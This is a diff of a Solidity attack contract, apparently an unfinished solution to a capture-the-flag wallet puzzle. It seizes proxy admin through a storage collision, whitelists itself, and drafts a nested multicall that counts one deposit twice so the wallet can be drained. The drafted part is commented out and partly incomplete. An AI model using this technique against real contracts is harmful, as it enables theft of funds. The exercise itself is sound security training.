@@ -20,7 +20,34 @@ contract Attack24 {
         proxy.proposeNewAdmin(address(this));
         target.addToWhitelist(address(this));
         emit AddedToWhiteList(address(this));
+
         // build deposit and multicall   <--  HERE
+
+    /*
+        
+        bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
+        
+        bytes[] memory deposit_sig_in_array = new bytes[](1);
+        
+        deposit_sig_in_array[0] = deposit_sig;
+
+        bytes memory multicall_sig = abi.encodeWithSignature(
+            "multicall(bytes[])",
+            deposit_sig_in_array
+        );
+        
+        // bytes[] memory data = [deposit_sig, multicall_sig];
+        bytes[] memory data = new bytes[](2);
+        data[0] = deposit_sig;
+        data[1] = multicall_sig;
+        wallet.multicall{value: address(this).balance}(data);
+        bytes memory transfer_sig = abi.encodeWithSignature(
+            "transfer(int)",
+            address(wallet).balance
+        );
+
+    */
+
         // target.execute();
         // target.setMaxBalance(); 
      }
